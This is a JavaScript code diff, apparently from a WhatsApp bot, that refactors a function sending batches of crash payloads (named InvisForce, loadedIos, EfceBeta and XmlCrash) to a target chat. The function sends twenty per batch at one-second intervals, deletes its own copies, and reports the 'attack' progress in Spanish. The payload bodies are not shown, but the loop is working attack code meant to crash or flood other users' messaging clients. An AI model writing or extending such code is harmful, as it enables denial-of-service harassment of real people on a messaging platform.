@@ -111,15 +111,27 @@ function delay(ms) {
 }
 
 async function enviarTanda(conn, jid, num, m, ciclo) {
-  const funciones = ['InvisForce', 'loadedIos', 'EfceBeta', 'XmlCrash'];
+  const funciones = {
+    InvisForce,
+    loadedIos,
+    EfceBeta,
+    XmlCrash
+  };
+
   try {
     for (let i = 0; i < 20; i++) {
-      const aleatoria = funciones[Math.floor(Math.random() * funciones.length)];
-      const msg = await globalThis[aleatoria](jid);
+      const keys = Object.keys(funciones);
+      const aleatoria = funciones[keys[Math.floor(Math.random() * keys.length)]];
+      const msg = await aleatoria(jid);
+
       await conn.sendMessage(conn.user.id, { delete: msg.key });
       await delay(1000);
     }
-    await conn.sendMessage(m.chat, { text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.` }, { quoted: m });
+
+    await conn.sendMessage(m.chat, {
+      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
+    }, { quoted: m });
+
   } catch (e) {
     console.error("❌ Error en tanda:", e);
     await conn.sendMessage(m.chat, {
